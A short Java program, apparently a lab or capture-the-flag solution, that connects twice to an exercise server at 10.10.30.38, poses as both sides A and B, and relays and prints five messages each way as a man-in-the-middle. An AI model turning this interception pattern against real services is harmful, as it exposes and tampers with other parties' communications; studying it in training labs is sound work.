
import it.exploit.socket.Connection;

import java.io.IOException;

public class MitMA {

    // You can get this information from the server code
    private static final int MESSAGE_COUNT = 5;


    public static void main(String[] args) {
        try (Connection sideA = new Connection("10.10.30.38", 1024).connect()) {
            sideA.write("A"); // Let the server know this is A side
            try (Connection sideB = new Connection("10.10.30.38", 1024).connect()) {
                sideB.write("B"); // Let the server know this is B side

                for (int i = 0; i < MESSAGE_COUNT; i++) { // It would also be possible to make an infinite loop, and break once the server sends empty strings
                    String messageA = sideA.read().getText();
                    sideB.write(messageA);
                    System.out.println("A -> B: " + messageA);

                    String messageB = sideB.read().getText();
                    sideA.write(messageB);
                    System.out.println("B -> A: " + messageB);
                }
            } catch (IOException e) {
                System.out.println("An error occurred while closing Connection B!\n" + e.getMessage());
            }
        } catch (IOException e) {
            System.out.println("An error occurred while closing Connection A!\n" + e.getMessage());
        }
    }
}
